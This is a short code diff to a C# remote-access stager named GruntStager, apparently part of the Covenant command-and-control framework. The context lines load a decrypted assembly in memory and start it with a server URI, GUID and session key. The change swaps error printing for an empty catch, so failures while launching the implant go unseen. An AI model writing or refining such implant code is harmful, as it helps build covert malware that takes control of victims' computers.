@@ -127,7 +127,7 @@ namespace GruntStager
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                 gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, GUID, SessionKey, messenger.client });
             }
-            catch (Exception e) { Console.Error.WriteLine(e.Message); }
+            catch { }
         }
 
         public static List<string> Parse(string data, string format)
